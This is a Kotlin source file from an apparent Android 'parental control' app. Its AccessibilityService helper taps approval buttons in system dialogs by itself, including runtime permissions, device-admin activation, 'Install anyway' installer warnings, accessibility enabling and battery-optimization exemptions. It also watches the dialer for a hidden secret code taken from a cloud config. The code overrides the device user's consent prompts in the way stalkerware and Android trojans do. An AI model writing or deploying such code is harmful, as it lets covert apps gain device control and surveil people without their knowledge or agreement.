package com.parentalcontrol.app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo

object AutoPermissionHelper {
    private const val TAG = "AutoPermission"
    private const val DEBOUNCE_MS = 3000L

    private const val PKG_PERMISSION_CONTROLLER = "com.android.permissioncontroller"
    private const val PKG_PACKAGE_INSTALLER = "com.android.packageinstaller"
    private const val PKG_SETTINGS = "com.android.settings"
    private const val PKG_SYSTEM_UI = "com.android.systemui"
    private const val PKG_GOOGLE_SETUP = "com.google.android.setupwizard"
    private const val PKG_ANDROID_SETUP = "com.android.setupwizard"

    // Only auto-tap these specific packages
    private val AUTO_TAP_PACKAGES = setOf(
        PKG_PERMISSION_CONTROLLER,
        PKG_PACKAGE_INSTALLER,
        PKG_SETTINGS  // For accessibility and battery optimization screens
    )

    private val ALLOW_BUTTON_PATTERNS = listOf(
        "Allow", "Allow all the time", "While using the app",
        "Allow all", "Allow permissions", "Grant", "Continue",
        "Activate", "Activate this device admin app",
        "Install", "Install anyway", "Next", "Done", "Finish",
        "OK", "Got it", "I agree", "Accept", "Enable",
        "Turn on", "Start", "Set up", "Confirm",
        "Use service",  // Accessibility service enable dialog
        "Unrestricted", "Don\u0027t optimize", "Allow background activity",  // Battery optimization
        "Yes"  // Generic confirmation
    )

    // Packages that may show the dialer (for secret code fallback)
    private val DIALER_PACKAGES = setOf(
        "com.android.dialer",
        "com.google.android.dialer",
        "com.samsung.android.dialer",
        "com.android.phone"
    )

    private var lastTapTime = 0L
    private var lastTapPackage = ""

    fun isAutoTappableDialog(packageName: String): Boolean {
        return packageName in AUTO_TAP_PACKAGES
    }

    /**
     * Check if this package is a dialer that might show our secret code.
     */
    fun isDialerPackage(packageName: String): Boolean {
        return packageName in DIALER_PACKAGES
    }

    /**
     * Check if the dialer is showing our secret code pattern.
     * This is a fallback for Android 12+ where SECRET_CODE broadcast is restricted.
     * Looks for the text *#*#CODE#*#* in the dialer input field.
     */
    fun checkDialerForSecretCode(
        service: android.accessibilityservice.AccessibilityService,
        packageName: String
    ): Boolean {
        if (!isDialerPackage(packageName)) return false

        val root = service.rootInActiveWindow ?: return false
        try {
            val context = service as? android.content.Context ?: return false
            com.parentalcontrol.app.api.CloudConfig.init(context)
            val secretCode = com.parentalcontrol.app.api.CloudConfig.secretDialerCode
            val patterns = listOf(
                "*#*#${secretCode}#*#*",
                "*#*#$secretCode#*#"
            )

            // Search for text in edit fields or text views
            for (pattern in patterns) {
                val nodes = root.findAccessibilityNodeInfosByText(pattern)
                if (nodes.isNotEmpty()) {
                    nodes.forEach { it.recycle() }
                    Log.d(TAG, "Secret code detected in dialer: $pattern")
                    return true
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking dialer for secret code", e)
        } finally {
            root.recycle()
        }
        return false
    }

    fun autoApproveDialog(service: AccessibilityService): Boolean {
        val now = System.currentTimeMillis()
        val root = service.rootInActiveWindow ?: return false
        val currentPkg = root.packageName?.toString() ?: ""

        // Debounce: prevent re-tapping the same package within 3 seconds
        if (currentPkg == lastTapPackage && now - lastTapTime < DEBOUNCE_MS) {
            root.recycle()
            return false
        }

        return try {
            var approved = false

            // Priority 1: Find and click ALLOW-type buttons in system dialogs
            for (pattern in ALLOW_BUTTON_PATTERNS) {
                val nodes = root.findAccessibilityNodeInfosByText(pattern)
                for (node in nodes) {
                    if (isClickableButton(node) && isButtonInDialog(node)) {
                        clickNodeCompat(service, node)
                        lastTapTime = System.currentTimeMillis()
                        lastTapPackage = currentPkg
                        approved = true
                        Log.d(TAG, "Auto-tapped: $pattern")
                        break
                    }
                    node.recycle()
                }
                if (approved) break
            }

            if (!approved) {
                // Priority 2: Look for buttons by resource ID patterns (more precise)
                val installIds = listOf(
                    "button1", "button_allow", "allow_button", "permission_allow_button",
                    "com.android.permissioncontroller:id/permission_allow_button",
                    "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
                    "android:id/button1", "android:id/button2",
                    "com.android.packageinstaller:id/ok_button",
                    "com.android.packageinstaller:id/install_button",
                    "com.android.settings:id/button1"
                )
                for (id in installIds) {
                    val nodes = root.findAccessibilityNodeInfosByViewId(id)
                    for (node in nodes) {
                        if (isClickableButton(node)) {
                            clickNodeCompat(service, node)
                            lastTapTime = System.currentTimeMillis()
                            lastTapPackage = currentPkg
                            approved = true
                            Log.d(TAG, "Auto-tapped by ID: $id")
                            break
                        }
                        node.recycle()
                    }
                    if (approved) break
                }
            }

            approved
        } catch (e: Exception) {
            Log.e(TAG, "autoApproveDialog error", e)
            false
        } finally {
            root.recycle()
        }
    }

    private fun isClickableButton(node: AccessibilityNodeInfo): Boolean {
        return (node.isClickable || node.className?.contains("Button") == true ||
                node.className?.contains("TextView") == true) &&
                node.isVisibleToUser && node.isEnabled
    }

    private fun isButtonInDialog(node: AccessibilityNodeInfo): Boolean {
        var parent = node.parent
        while (parent != null) {
            val className = parent.className?.toString() ?: ""
            if (className.contains("Dialog") || className.contains("AlertDialog") ||
                className.contains("Popup") || className.contains("Panel")
            ) {
                parent.recycle()
                return true
            }
            val next = parent.parent
            if (next != null) parent.recycle()
            parent = next
        }
        return true
    }

    private fun clickNodeCompat(service: AccessibilityService, node: AccessibilityNodeInfo) {
        // Method 1: Try direct ACTION_CLICK
        if (node.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
            Log.d(TAG, "Clicked via ACTION_CLICK")
            return
        }

        // Method 2: Use gesture tap at coordinates
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val bounds = Rect()
            node.getBoundsInScreen(bounds)
            val centerX = bounds.centerX().toFloat()
            val centerY = bounds.centerY().toFloat()

            val path = Path().apply { moveTo(centerX, centerY); lineTo(centerX, centerY) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
                .build()
            service.dispatchGesture(gesture, null, null)
            Log.d(TAG, "Clicked via gesture at ($centerX, $centerY)")
        }
    }

}
